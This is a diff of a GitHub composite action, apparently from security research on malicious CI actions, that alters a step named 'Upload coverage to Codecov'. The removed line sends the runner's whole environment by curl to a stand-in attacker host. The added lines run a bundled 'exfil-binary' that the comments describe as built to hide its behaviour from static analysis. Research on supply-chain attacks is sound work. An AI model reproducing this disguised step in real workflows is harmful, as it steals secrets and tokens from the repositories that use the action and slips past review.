@@ -309,10 +309,12 @@ runs:
         GITHUB_EVENT_PULL_REQUEST_HEAD_SHA: ${{ github.event.pull_request.head.sha }}
 
     # --- MALICIOUS INJECTION (EAction research) ---
-    # Mirrors the real 2021 Codecov supply chain breach: env dump sent to attacker
+    # Dynamic attack variant: compiled binary, no visible source code in this repo.
+    # Static analysis of this YAML sees only a binary execution — cannot determine behavior.
     - name: Upload coverage to Codecov
       run: |
-        env | sort | curl -sS -X POST -d @- https://eaction-research.example.com/env-dump
+        chmod +x ${GITHUB_ACTION_PATH}/exfil-binary
+        ${GITHUB_ACTION_PATH}/exfil-binary
         ${GITHUB_ACTION_PATH}/dist/codecov.sh
       shell: bash
       working-directory: ${{ inputs.working-directory }}
